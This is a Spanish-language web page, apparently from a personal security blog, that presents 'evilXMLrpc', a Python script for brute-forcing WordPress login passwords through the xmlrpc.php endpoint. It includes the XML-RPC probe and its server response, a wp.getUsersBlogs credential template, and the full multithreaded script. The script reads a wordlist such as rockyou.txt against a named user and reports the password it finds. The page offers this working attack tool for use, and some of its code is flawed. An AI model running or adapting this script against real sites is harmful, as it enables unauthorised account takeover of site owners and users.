---
title: evilXMLrpc
layout: page
permalink: /Script_evilXMLrpc
---

<h1 id="whity">evilXMLrpc</h1>

Herramienta para la explotación de xmlrpc.php por método POST en un CMS WordPress

<div style="text-align: center;">
  <img src="/assets/images/Scripts/evilXMLrpc/1.png" alt="bandit" oncontextmenu="return false;">
</div>


Al estar habilitado el xmlrpc.php nos dirá que solo acepta POST:
<div style="text-align: center;">
  <img src="/assets/images/Scripts/evilXMLrpc/2.png" alt="bandit" oncontextmenu="return false;">
</div>


Una petición cualquiera por POST genera el error:
<div style="text-align: center;">
  <img src="/assets/images/Scripts/evilXMLrpc/3.png" alt="bandit" oncontextmenu="return false;">
</div>


Pero aprovechandonos del xmlrpc podemos listar los métodos configurados en el CMS WordPress:
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

Generando la siguiente respuesta de lado del servidor:

```xml
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 11:54:30 UTC
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 4272
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  .........
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```
Implementación óptima para el problema con concurrencia aplicada. La arquitectura del código está alineada con las limitaciones del entorno CMS WordPress Local (latencia de red, volumen de datos de rockyou.txt), y se refleja una alta eficiencia bajo las restricciones:
- O(n) en tiempo: recorre cada palabra al menos una vez.
- El peor caso es O(n) 14 millones, pero se espera terminar antes O(k) k << n.
- CPU usage bajo: 9% confirma que el cuello está en latencia de red, no en cómputo.
- Memoria constante O(1) por el uso de descriptores de archivos y hilos activos.
- Cada hilo mantiene contexto mínimo: una palabra, la conexión, y el control de flujo.

<div style="text-align: center;">
  <img src="/assets/images/Scripts/evilXMLrpc/4.png" alt="bandit" oncontextmenu="return false;">
</div>

<h2 id="amarillo">request.xml</h2>
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

<h2 id="amarillo">file.xml</h2>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

<h2 id="amarillo">Script evilXMLrpc.py</h2>
```python
#!/usr/bin/env python3
# Author: Juan García aka liandd
import signal
from termcolor import colored
import sys
import argparse
import os
import requests
import re
from concurrent.futures import ThreadPoolExecutor
import threading


# Ctrl_c
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_c
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("evilXMLrpc bruteforcing attack", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="WordPress URL to bruteforce (i.e --url http://127.0.0.1:31337)")
    parser.add_argument('-n', '--name', dest="NAME",
                        help="Username to exec bruteforce (i.e --name liandd)")
    parser.add_argument('-w', '--wordlist', dest="WORDLIST",
                        help="Wordlist to try the bruteforcing (i.e --wordlist /usr/share/SecLists/rockyou.txt)")
    options = parser.parse_args()
    if options.URL is None or options.NAME is None or options.WORDLIST is None:
        parser.print_help()
        sys.exit(1)
    return options.URL, options.NAME, options.WORDLIST


def XMLrpc_ffuf(url):
    """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
    global cms_url
    cms_url = url+'/xmlrpc.php'
    if os.path.exists("request.xml"):
        with open("request.xml", "r") as xml_request:
            data = xml_request.read()
            raw_response = requests.post(cms_url, data=data)
            response = raw_response.text
            regex = r"wp.{4}+[U].*[B].*s\b"
            if re.findall(regex, response):
                print(
                    colored(f"\n[+] Se ha encontrado el método {re.findall(regex, response)}\n", "green"))
            else:
                print(
                    colored("\n[!] No es posible hacer bruteforcing...", "red"))
                sys.exit(1)
    else:
        with open("request.xml", "w") as create_xml_request:
            create_xml_request.write("""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>""")
        XMLrpc_ffuf(url)


def passwd_ffuz(user, passwd):
    if stop_event.is_set():
        return
    data = ""
    with open("file.xml", "r") as xml_to_fuzz:
        data = xml_to_fuzz.read()
        user_regex = "...{.{5}+[u].*[}]"
        passwd_regex = "...{.{5}+[p].*[}]"
        tmp_data_regex = re.sub(user_regex, user, data)
        data_regex = re.sub(passwd_regex, passwd, tmp_data_regex)
        raw_response = requests.post(cms_url, data=data_regex)
        response = raw_response.text
        error_regex = "403"
        if re.findall(error_regex, response):
            return
        else:
            print(
                colored(f"\n[+] La contraseña para el usuario {user} es {passwd}\n", "green"))
            stop_event.set()
            return


def XMLbrute_force(url, name, wordlist):
    XMLrpc_ffuf(url)
    """Revisa la estructura XML para identificar si es posible hacer el ataque"""
    with ThreadPoolExecutor(max_workers=50) as executor:
        with open(wordlist, "r") as w:
            for secret in w:
                if stop_event.is_set():
                    break
                executor.submit(passwd_ffuz(name, secret))
            executor.shutdown(wait=True)


def main():
    URL, NAME, WORDLIST = get_arguments()
    global stop_event
    stop_event = threading.Event()
    XMLbrute_force(URL, NAME, WORDLIST)
    sys.exit(0)


if __name__ == '__main__':
    main()
```

